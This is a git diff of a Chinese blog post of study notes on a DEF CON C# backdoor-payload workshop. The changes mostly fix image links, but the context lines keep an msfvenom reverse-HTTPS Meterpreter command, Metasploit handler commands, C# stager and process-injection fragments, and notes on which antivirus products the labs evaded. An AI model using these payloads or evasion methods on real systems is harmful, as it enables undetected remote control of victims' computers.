@@ -89,10 +89,19 @@
 <meta property="og:site_name" content="scareing的学习笔记">
 <meta property="og:description" content="《使用C＃编写自定义后门负载》学习笔记及免杀尝试最近在逛GayHub时，偶然发现了《使用C＃编写自定义后门负载》这个项目,在实现的过程中，发现他给出的部分代码本身就有一定的免杀处理，其他的可利用代码也简单尝试过bypass AV，效果还行。 注：本文由本人首发于先知社区  项目地址  https://github.com/mvelazc0/defcon27_csharp_workshop测试环境">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-10-05T16:11:26.032Z">
+<meta property="og:image" content="https://github.com/scareing/scareing.github.io/blob/master/2019/10/05/%E5%88%A9%E7%94%A8C%23byass%20AV/01.png">
+<meta property="og:image" content="https://github.com/scareing/scareing.github.io/blob/master/2019/10/05/%E5%88%A9%E7%94%A8C%23byass%20AV/02.png">
+<meta property="og:image" content="https://github.com/scareing/scareing.github.io/blob/master/2019/10/05/%E5%88%A9%E7%94%A8C%23byass%20AV/03.png">
+<meta property="og:image" content="https://github.com/scareing/scareing.github.io/blob/master/2019/10/05/%E5%88%A9%E7%94%A8C%23byass%20AV/04.png">
+<meta property="og:image" content="https://github.com/scareing/scareing.github.io/blob/master/2019/10/05/%E5%88%A9%E7%94%A8C%23byass%20AV/05.png">
+<meta property="og:image" content="https://github.com/scareing/scareing.github.io/blob/master/2019/10/05/%E5%88%A9%E7%94%A8C%23byass%20AV/06.png">
+<meta property="og:image" content="https://github.com/scareing/scareing.github.io/blob/master/2019/10/05/%E5%88%A9%E7%94%A8C%23byass%20AV/07.png">
+<meta property="og:image" content="https://github.com/scareing/scareing.github.io/blob/master/2019/10/05/%E5%88%A9%E7%94%A8C%23byass%20AV/08.png">
+<meta property="og:updated_time" content="2019-10-05T16:15:58.481Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="《使用C＃编写自定义后门负载》学习笔记及免杀尝试">
 <meta name="twitter:description" content="《使用C＃编写自定义后门负载》学习笔记及免杀尝试最近在逛GayHub时，偶然发现了《使用C＃编写自定义后门负载》这个项目,在实现的过程中，发现他给出的部分代码本身就有一定的免杀处理，其他的可利用代码也简单尝试过bypass AV，效果还行。 注：本文由本人首发于先知社区  项目地址  https://github.com/mvelazc0/defcon27_csharp_workshop测试环境">
+<meta name="twitter:image" content="https://github.com/scareing/scareing.github.io/blob/master/2019/10/05/%E5%88%A9%E7%94%A8C%23byass%20AV/01.png">
 
 
 
@@ -373,7 +382,7 @@
 <pre><code>openssl genrsa&gt;privkey.pem    //生成密钥
 openssl req -new -x509 -key privkey.pem -out cert.pem -days 365    //用生成的密钥生成证书
 twistd -n web -c cert.pem -k privkey.pem --https=8080    //监听8080的web服务</code></pre><p>0x02</p>
-<pre><code>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.22.35.212 LPORT=8080 -f exe -o demo.exe    //生成一个https的程序·。</code></pre><p>然后将这个程序下载到Win下运行，第一步监听8080的web服务就会捕捉到一个https请求的日志。<br> ![avatar](<a href="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/05/利用C#byass" target="_blank" rel="noopener">https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/05/利用C#byass</a> AV/01.png)<br> 将这个请求复制到lab2的2.cs中</p>
+<pre><code>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.22.35.212 LPORT=8080 -f exe -o demo.exe    //生成一个https的程序·。</code></pre><p>然后将这个程序下载到Win下运行，第一步监听8080的web服务就会捕捉到一个https请求的日志。<br> <img src="https://github.com/scareing/scareing.github.io/blob/master/2019/10/05/%E5%88%A9%E7%94%A8C%23byass%20AV/01.png" alt="avatar"><br> 将这个请求复制到lab2的2.cs中</p>
 <pre><code> using System.Net;
  using System.Text;
  using System.Configuration.Install;
@@ -427,7 +436,7 @@ public static void Stager(string url)
 }
 }</code></pre><p> 编译程序，然后msf开启监听，运行即返回session。</p>
 <pre><code>C:\windows\microsoft.net\framework\v4.0.30319\csc.exe 2.cs    //编译程序
-handler -H 172.22.35.212 -P 8080 -p windows/x64/meterpreter/reverse_https    //msf开启监听</code></pre><p> ![avatar](<a href="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/05/利用C#byass" target="_blank" rel="noopener">https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/05/利用C#byass</a> AV/02.png)</p>
+handler -H 172.22.35.212 -P 8080 -p windows/x64/meterpreter/reverse_https    //msf开启监听</code></pre><p> <img src="https://github.com/scareing/scareing.github.io/blob/master/2019/10/05/%E5%88%A9%E7%94%A8C%23byass%20AV/02.png" alt="avatar"></p>
 <h1 id="lab3-lab4"><a href="#lab3-lab4" class="headerlink" title="lab3+lab4"></a>lab3+lab4</h1><blockquote>
 <p>最后结果：360，电脑管家过。<br>lab4 其实就是lab3的免杀版，通过对shellcode进行xor或aes加密来实现免杀.<br>windows defender一直没法pass,简单的修改加密的key值也无济于事。</p>
 </blockquote>
@@ -530,7 +539,7 @@ public static void Main()
 
 
 }
-}</code></pre><p>正常返回session<br> ![avatar](<a href="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/05/利用C#byass" target="_blank" rel="noopener">https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/05/利用C#byass</a> AV/03.png)</p>
+}</code></pre><p>正常返回session<br> <img src="https://github.com/scareing/scareing.github.io/blob/master/2019/10/05/%E5%88%A9%E7%94%A8C%23byass%20AV/03.png" alt="avatar"></p>
 <h2 id="lab6"><a href="#lab6" class="headerlink" title="lab6"></a>lab6</h2><blockquote>
 <p>测试结果：过360和电脑管家<br>lab6主要是dll注入，目前来说360和电脑管家对dll的查杀好像没那么强。<br>lab6的重点是将dll注入到一个已存在的进程中，使其逃避安全人员的检测。</p>
 </blockquote>
@@ -792,7 +801,7 @@ public static void Main()
     CreateRemoteThread(hProcess, new IntPtr(0), new uint(), spaceAddr, new IntPtr(0), new uint(), new IntPtr(0));
  }
 }</code></pre><p>0x03</p>
-<p> 一个正常进程，返回了session。<br> ![avatar](<a href="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/05/利用C#byass" target="_blank" rel="noopener">https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/05/利用C#byass</a> AV/04.png)<br> ![avatar](<a href="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/05/利用C#byass" target="_blank" rel="noopener">https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/05/利用C#byass</a> AV/05.png)</p>
+<p> 一个正常进程，返回了session。<br> <img src="https://github.com/scareing/scareing.github.io/blob/master/2019/10/05/%E5%88%A9%E7%94%A8C%23byass%20AV/04.png" alt="avatar"><br> <img src="https://github.com/scareing/scareing.github.io/blob/master/2019/10/05/%E5%88%A9%E7%94%A8C%23byass%20AV/05.png" alt="avatar"></p>
 <h2 id="lab8"><a href="#lab8" class="headerlink" title="lab8"></a>lab8</h2><blockquote>
 <p>测试结果：全过。</p>
 </blockquote>
@@ -1195,7 +1204,7 @@ class UnmanagedExecute
     }
 }
 }</code></pre><p>0x02 </p>
-<pre><code>handler -H 172.22.35.212 -P 8080 -p windows/x64/meterpreter/reverse_https    //监听</code></pre><p> ![avatar](<a href="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/05/利用C#byass" target="_blank" rel="noopener">https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/05/利用C#byass</a> AV/06.png)<br> ![avatar](<a href="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/05/利用C#byass" target="_blank" rel="noopener">https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/05/利用C#byass</a> AV/07.png)</p>
+<pre><code>handler -H 172.22.35.212 -P 8080 -p windows/x64/meterpreter/reverse_https    //监听</code></pre><p> <img src="https://github.com/scareing/scareing.github.io/blob/master/2019/10/05/%E5%88%A9%E7%94%A8C%23byass%20AV/06.png" alt="avatar"><br> <img src="https://github.com/scareing/scareing.github.io/blob/master/2019/10/05/%E5%88%A9%E7%94%A8C%23byass%20AV/07.png" alt="avatar"></p>
 <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
 <li><p>这个项目的免杀效果不错，在深层次的自定义后会更难被检测。</p>
 </li>
@@ -1206,7 +1215,7 @@ class UnmanagedExecute
 <li><p>感觉还是自己写加载器比较容易免杀，比如lab2那个加载器，根本不会遇到阻拦。</p>
 </li>
 <li><p>后期加壳对免杀有很大帮助，尤其是商业化的加壳工具。</p>
-<p>![avatar](<a href="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/05/利用C#byass" target="_blank" rel="noopener">https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/05/利用C#byass</a> AV/08.png)</p>
+<p><img src="https://github.com/scareing/scareing.github.io/blob/master/2019/10/05/%E5%88%A9%E7%94%A8C%23byass%20AV/08.png" alt="avatar"></p>
 </li>
 </ul>
 
